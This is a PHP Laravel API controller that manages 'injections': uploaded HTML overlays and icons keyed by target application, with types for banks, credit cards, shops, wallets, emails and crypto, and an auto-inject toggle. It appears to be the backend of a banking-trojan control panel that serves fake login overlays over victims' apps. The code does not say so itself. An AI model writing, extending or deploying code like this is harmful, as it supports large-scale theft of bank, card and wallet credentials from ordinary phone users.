<?php

namespace App\Http\Controllers\Api\v1;

use App\Helpers\ApiResponse;
use App\Http\Controllers\Controller;
use App\Models\Injection;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Illuminate\Validation\ValidationException;

class InjectionController extends Controller
{
    /**
     * @throws ValidationException
     */
    public function index(Request $request): ApiResponse
    {
        $this->validate($request, [
            "per_page" => "integer",
            "filters" => "array",
            "filters.autoInject" => "boolean",
            "filters.type" => "string|nullable",
            "filters.query" => "string|nullable",
            "filters.autoInjects" => "boolean|nullable",
        ]);

        $autoInject = $request->get("filters")["autoInject"] ?? NULL;
        $type = $request->get("filters")["type"] ?? NULL;
        $searchQuery = $request->get("filters")["query"] ?? NULL;
        $autoInjects = $request->get("filters")["autoInjects"] ?? NULL;

        $injections = Injection::orderByDesc("name")
            ->when(!empty($autoInject), function ($query) use ($autoInject) {
                $query->where("auto", $autoInject);
            })
            ->when(!empty($type), function ($query) use ($type) {
                $query->where("type", $type);
            })
            ->when(!empty($searchQuery), function ($query) use ($searchQuery) {
                $query->where("application", "LIKE", "%$searchQuery%")
                    ->orWhere("name", "LIKE", "%$searchQuery%")
                    ->orWhere("type", "LIKE", "%$searchQuery%");
            })
            ->when($autoInjects !== NULL, function ($query) use ($autoInjects) {
                $query->where("auto", $autoInjects);
            })
            ->paginate($request->get("per_page", 15));

        return ApiResponse::success([
            "injections" => $injections,
        ]);
    }

    /**
     * @throws ValidationException
     */
    public function create(Request $request): ApiResponse
    {
        $this->validate($request, [
            "html" => "required|file|mimes:html",
            "image" => "required|file|mimes:png",
            "name" => "required|string",
            "application" => "required|string|unique:injections,application",
            "type" => "required|string|in:banks,credit_cards,shops,wallets,emails,crypt",
        ]);

        $type = $request->get("type");
        $name = $request->get("name");
        $application = $request->get("application");

        $htmlFilePath = "/injects/html/$type";
        $imageFilePath = "/injects/images/$type";
        $nameFilePath = "/injects/names/$type";

        $htmlFile = $request->file("html");
        $imageFile = $request->file("image");

        $htmlFileName = $application . ".html";
        $imageFileName = $application . ".png";

        $htmlFile?->storeAs($htmlFilePath, $htmlFileName, [
            "disk" => "public",
        ]);

        $imageFile?->storeAs($imageFilePath, $imageFileName, [
            "disk" => "public",
        ]);

        Storage::disk("public")
            ->put("$nameFilePath/$application.txt", $name);

        $injection = new Injection();
        $injection->fill([
            "name" => $request->get("name"),
            "application" => $request->get("application"),
            "type" => $type,
            "html" => $htmlFilePath . "/" . $htmlFileName,
            "image" => $imageFilePath . "/" . $imageFileName,
        ]);

        $injection->save();

        $injection->files()->create([
            "html_blob" => $htmlFile->getContent(),
            "image_blob" => $imageFile->getContent(),
        ]);

        return ApiResponse::success($injection);
    }

    /**
     * @throws ValidationException
     */
    public function update(Injection $injection, Request $request): ApiResponse
    {
        $this->validate($request, [
            "html" => "file|mimes:html",
            "image" => "file|mimes:png",
            "name" => "string",
            "application" => "string|unique:injections,application,$injection->id",
            "type" => "string|in:banks,credit_cards,shops,wallets,emails,crypt",
        ]);

        $storage = Storage::disk("public");

        if ($request->has("name")) {
            $storage->delete("/injects/names/$injection->type/$injection->application.txt");
        }

        if ($request->has("type")) {
            $injection->type = $request->get("type");
        }

        if ($request->has("application")) {
            if (!$request->has("html")) {
                $newHtmlPath = str_replace($injection->application, $request->get("application"), $injection->html);
                if ($storage->exists($injection->html) && !$storage->exists($newHtmlPath)) {
                    $storage->move(
                        $injection->html,
                        $newHtmlPath
                    );
                }

                $injection->html = $newHtmlPath;
            }

            if (!$request->has("image")) {
                $newImagePath = str_replace($injection->application, $request->get("application"), $injection->image);
                if ($storage->exists($injection->image) && !$storage->exists($newImagePath)) {
                    $storage->move(
                        $injection->image,
                        $newImagePath
                    );
                }

                $injection->image = $newImagePath;
            }

            $injection->application = $request->get("application");
        }

        $namesOldPath = "/injects/names/$injection->type/$injection->application.txt";

        $namesPath = str_replace($injection->application, $request->get("application"), $namesOldPath);

        if ($storage->exists($namesOldPath) && !$storage->exists($namesPath)) {
            $storage->move(
                $injection->image,
                $namesPath
            );
        }

        if ($request->has("name")) {
            $injection->name = $request->get("name");

            $nameFilePath = "/injects/names/$injection->type";

            $storage->put("$nameFilePath/$injection->application.txt", $request->get("name"));
        }

        if ($request->has("html")) {
            $htmlFile = $request->file("html");
            $htmlFilePath = "/injects/html/$injection->type";
            $htmlFileName = $injection->application . ".html";

            $storage->delete($injection->html);

            $injection->html = "/" . $htmlFile->storeAs($htmlFilePath, $htmlFileName, [
                    "disk" => "public",
                ]);

            $injection->files()->update([
                "html_blob" => $htmlFile->getContent(),
            ]);
        }

        if ($request->has("image")) {
            $imageFile = $request->file("image");
            $imageFilePath = "/injects/images/$injection->type";
            $imageFileName = $injection->application . ".png";
            $storage->delete($injection->image);

            $injection->image = "/" . $imageFile->storeAs($imageFilePath, $imageFileName, [
                    "disk" => "public",
                ]);

            $injection->files()->update([
                "image_blob" => $imageFile->getContent(),
            ]);
        }

        $injection->save();

        return ApiResponse::success($injection);
    }

    /**
     * @throws ValidationException
     */
    public function delete(Request $request): ApiResponse
    {
        $this->validate($request, [
            "ids" => "array|required",
            "ids.*" => "exists:injections,id",
        ]);

        $injections = Injection::whereIn("id", $request->get("ids"))->get();

        $store = Storage::disk("public");

        foreach ($injections as $injection) {
            $store->delete([
                $injection->html,
                $injection->image,
                "/injects/names/$injection->type/$injection->application.txt",
            ]);
            $injection->delete();
        }

        return ApiResponse::success([
            "ids" => $injections->pluck("id"),
        ]);
    }

    /**
     * @throws ValidationException
     */
    public function changeAutoInject(Injection $injection, Request $request): ApiResponse
    {
        $this->validate($request, [
            "autoInject" => "boolean|required",
        ]);

        $injection->update([
            "auto" => $request->get("autoInject"),
        ]);
        $injection->save();

        return ApiResponse::success($injection);
    }
}
